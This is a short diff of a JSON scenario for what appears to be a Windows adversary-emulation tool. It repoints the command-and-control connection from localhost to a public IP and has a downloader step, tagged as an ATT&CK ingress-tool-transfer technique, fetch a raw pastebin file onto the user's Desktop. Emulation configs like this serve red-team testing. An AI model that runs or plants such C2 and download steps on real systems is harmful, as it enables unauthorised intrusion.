@@ -7,7 +7,7 @@
         "operating_system_name": "windows",
         "script": {
             "0": {
-                "conf": "--cp 127.0.0.1:443 --secure true",
+                "conf": "--cp 35.229.19.7:443 --secure true",
                 "module": "https",
                 "type": "initialization"
             },
@@ -65,7 +65,7 @@
             "8": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
-                "request": "--src \"https://pastebin.com/ZyVJEYB4\" --dest \"%USERPROFILE%\\Desktop\\EvilCorp\\wasted_info.txt\"",
+                "request": "--src \"https://pastebin.com/raw/ZyVJEYB4\" --dest \"%USERPROFILE%\\Desktop\\wasted_info.txt\"",
                 "rtags": [
                     "att&ck-technique:T1105"
                 ],
